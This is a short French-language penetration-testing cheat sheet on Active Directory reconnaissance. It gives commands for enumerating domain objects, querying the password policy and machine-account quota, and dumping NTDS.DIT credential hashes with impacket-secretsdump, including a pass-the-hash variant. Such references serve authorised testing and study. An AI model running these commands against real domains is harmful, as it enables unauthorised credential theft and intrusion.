# Reconnaissance

### Énumération des objets

Récupérer les objets de l'Active Directory :

```
sudo goddi -username=<USER> -password="<PASS>" -dc="<IP-DC>" -domain="<domain.local>" -unsafe
```

_Il est possible de lire facilement le résultat avec la commande suivante : `cat <file>.csv | cut -d "," -f <COL>`._

### Politique de mot de passe

```
cme smb <IP>/<MASK> -u <USER> -p <PASSWORD> --pass-pol
```

```
ldapdomaindump.py -u "<domain.local>\<USER>" -p <PASS> -n <DNS ou IP-DC> <IP-DNS>
```

### Nombre de machines qu'un utilisateur peut ajouter au domaine

```
ldapsearch -x -H ldap://<IP-DC> -b "DC=<DOMAIN>,DC=<LOCAL>" -D "<USER>" -W -s sub "(objectclass=domain)" | grep ms-DS-MachineAccountQuota

# Ajouter une machine au domaine (PowerShell)
add-computer -domain <DOMAIN.LOCAL>
```

### Récupérer le fichier NTDS.DIT

_**Note :** nécessite les droits "Admins de domaine"._

```
impacket-secretsdump.py <DOMAIN.COM>/Administator:<PASSWORD>@<IP>
impacket-secretsdump administrateur@<DC-IP> -hashes <HASH>
```
